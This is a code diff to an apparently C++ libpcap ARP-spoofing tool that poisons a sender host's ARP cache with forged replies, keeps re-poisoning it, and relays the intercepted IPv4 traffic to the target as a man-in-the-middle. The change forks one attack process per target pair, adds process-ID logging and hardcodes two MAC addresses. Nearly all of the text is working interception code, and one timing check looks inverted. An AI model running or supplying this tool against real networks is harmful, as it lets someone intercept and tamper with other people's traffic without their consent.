@@ -1,6 +1,7 @@
 #include <cstdio>
 #include <pcap.h>
 #include <time.h>
+#include <unistd.h>
 #include "ethhdr.h"
 #include "arphdr.h"
 #include "ipv4hdr.h"
@@ -115,6 +116,7 @@ void send_arp(
 }
 
 int attack(char *dev, char *_target_ip, char *_sender_ip) {
+  int pid = getpid();
 	char errbuf[PCAP_ERRBUF_SIZE];
   
   pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
@@ -130,13 +132,13 @@ int attack(char *dev, char *_target_ip, char *_sender_ip) {
   Ip target_ip = Ip(_target_ip);
   Ip sender_ip = Ip(_sender_ip);
   cout << "target: " << string(target_ip) << " sender: " << string(sender_ip) << '\n';
-  Mac sender_mac = get_mac_by_ip(handle, current_mac, current_ip, sender_ip);
-  Mac target_mac = get_mac_by_ip(handle, current_mac, current_ip, target_ip);
+  // Mac sender_mac = get_mac_by_ip(handle, current_mac, current_ip, sender_ip);
+  // Mac target_mac = get_mac_by_ip(handle, current_mac, current_ip, target_ip);
   
-  // Mac sender_mac = Mac("7C:10:C9:D2:82:96");
-  // Mac target_mac = Mac("00:23:AA:79:8C:9C");
+  Mac sender_mac = Mac("7C:10:C9:D2:82:96");
+  Mac target_mac = Mac("00:23:AA:79:8C:9C");
 
-  cout << "target_mac: " << string(target_mac) << " sender mac: " << string(sender_mac) << '\n';
+  cout << "[" << pid << "] " << "target_mac: " << string(target_mac) << " sender mac: " << string(sender_mac) << '\n';
   send_arp(handle, current_mac, sender_mac, current_mac, target_ip, sender_mac, sender_ip, ArpHdr::Reply);
   clock_t init = clock();
   clock_t init_zero = clock();
@@ -155,12 +157,12 @@ int attack(char *dev, char *_target_ip, char *_sender_ip) {
     EthArpPacket* recover_packet = (EthArpPacket*) packet;
     // recover packet
     if (recover_packet->eth_.type() == EthHdr::Arp && recover_packet->arp_.op() == ArpHdr::Request && recover_packet->arp_.tip() == target_ip) {
-      printf("poisoning arp again - arp received\n");
+      printf("[%d] poisoning arp again - arp received\n", pid);
       send_arp(handle, current_mac, sender_mac, current_mac, target_ip, sender_mac, sender_ip, ArpHdr::Reply);
       continue;
     } else if ((init - clock()) > 3000) {
       // more than 3s, re poision arp table of sender
-      printf("poisoning arp again - time passed than 3times\n");
+      printf("[%d] poisoning arp again - time passed than 3times\n", pid);
       send_arp(handle, current_mac, sender_mac, current_mac, target_ip, sender_mac, sender_ip, ArpHdr::Reply);
       init = clock();
       continue;
@@ -169,6 +171,7 @@ int attack(char *dev, char *_target_ip, char *_sender_ip) {
     EthIpv4Packet* spoof_packet = (EthIpv4Packet*) packet;
     // sender -> me -> target
     if (spoof_packet->eth_.smac() == sender_mac && spoof_packet->eth_.dmac() == current_mac) {
+      printf("[%d]", pid);
       if (spoof_packet->eth_.type() == EthHdr::Ip4) {
         printf("ipv4 ");
       } else if (spoof_packet->eth_.type() == EthHdr::Arp) {
@@ -193,7 +196,7 @@ int attack(char *dev, char *_target_ip, char *_sender_ip) {
 	      if (res != 0) {
 		      fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
 	      } else {
-          printf("packet replyed with %d bytes, took %f times\n", header->caplen, (double)(clock() - start_loop));
+          printf("[%d] packet replyed with %d bytes, took %f times\n", pid, header->caplen, (double)(clock() - start_loop));
         }
       }
     }
@@ -210,7 +213,12 @@ int main(int argc, char* argv[]) {
 	char* dev = argv[1];
   printf("%d\n", argc);
   for (int i = 2; i < argc; i += 2) {
-    attack(dev, argv[i + 1], argv[i]);
+    pid_t pid;
+    pid = fork();
+    if (pid == 0) {
+      printf("%d attack start", i);
+      attack(dev, argv[i + 1], argv[i]);
+    }
   }
 
   return 1;
